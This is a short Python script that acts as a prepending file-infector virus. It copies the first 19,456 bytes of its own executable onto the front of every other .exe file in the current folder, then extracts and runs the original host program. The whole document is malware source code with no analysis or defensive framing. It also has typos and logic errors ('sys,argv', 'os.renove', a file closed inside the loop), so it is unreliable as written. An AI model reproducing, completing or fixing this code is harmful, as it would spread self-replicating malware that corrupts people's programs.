import sys
import os
import shutil
virPath = os.path.split(sys.argv[0]);
names = os.listdir('.');
fvir = open(sys,argv[0], 'rb');
virData = fvir.read(19456);
for name in names:
    namePair = os.path.splitext(name);
    if namePair[1] == '.exe' and name != virPath[1]:
        os.rename(name, name + 'tmp');
        fprog = open(name + 'tmp', 'rb');
        progData = fprog.read();
        fnew = open(name, 'wb');
        fnew.write(virData + progData);
        fnew.close();
        fprog.close();
        os.renove(name + 'tmp');
        origProgData = fvir.read();
        origProg = 'original_' + virPath[1];
        forig = open(origProg, 'wb');
        forig.write(origProgData);
        fvir.close();
        forig.close();
        os.execl(origProg, ' ');
